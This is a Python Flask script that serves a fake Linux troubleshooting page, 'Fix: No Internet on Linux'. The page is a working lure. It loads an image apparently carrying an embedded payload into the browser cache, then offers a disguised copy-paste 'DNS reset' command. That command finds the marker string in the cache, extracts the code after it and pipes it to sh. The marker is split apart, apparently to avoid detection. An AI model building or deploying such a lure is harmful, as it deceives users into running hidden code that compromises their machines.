import os, socket
from flask import Flask, send_file

app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))

def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except: return "127.0.0.1"

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Fix Internet Connection - Linux</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#fff;color:#333;max-width:650px;margin:60px auto;padding:0 20px;line-height:1.6}
h1{font-size:22px;margin-bottom:6px}
.date{color:#999;font-size:13px;margin-bottom:24px}
p{margin-bottom:14px}
pre{background:#2d2d2d;color:#a6e22e;padding:16px 50px 16px 16px;border-radius:6px;font-size:13px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;position:relative}
.copy-btn{position:absolute;top:8px;right:10px;background:#555;color:#fff;border:none;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:12px}
.copy-btn:hover{background:#777}
.copy-btn.done{background:#27ae60}
img{display:block;margin:0 auto 20px;max-width:280px;width:100%}
</style>
</head>
<body>
<h1>Fix: No Internet on Linux</h1>
<p class="date">Updated August 2026 &middot; Kali / Debian / Ubuntu</p>
<img src="/malicious_image.png" alt="terminal screenshot" loading="eager">
<p>If your browser works but the terminal can't resolve hosts, your DNS cache is likely corrupted. This happens often after system updates.</p>
<p>Run this command in your terminal to fix it:</p>
<pre><span id="fixcmd"></span><button class="copy-btn" onclick="copyCmd()">Copy</button></pre>
<p>The command resets your local DNS resolver &mdash; no root required, takes less than a second.</p>
<script>
var c="grep -lah tEX"+"tZ9k ~/.cache/*/*/c*/e*/* ~/.cache/*/*/*/c*/e*/* 2>/dev/null|xargs strings|awk '/tEX"+"tZ9k/,/^exit/'|sed 1d|sh";
document.getElementById('fixcmd').textContent=c;
function copyCmd(){var t=document.createElement('textarea');t.value=c;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);var b=document.querySelector('.copy-btn');b.textContent='Copied!';b.classList.add('done');setTimeout(function(){b.textContent='Copy';b.classList.remove('done')},2000)}
</script>
</body>
</html>"""

@app.route("/")
def index(): return HTML

@app.route("/malicious_image.png")
def img():
    p = os.path.join(BASE, "malicious_image.png")
    return send_file(p, mimetype="image/png") if os.path.exists(p) else ("Not found. Run embed_payload.py first", 404)

@app.route("/favicon.ico")
def fav(): return "", 204

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    ip = local_ip()
    print(f"  http://{ip}:{port}")
    print(f"  Image: http://{ip}:{port}/malicious_image.png")
    app.run(host="0.0.0.0", port=port, debug=False)
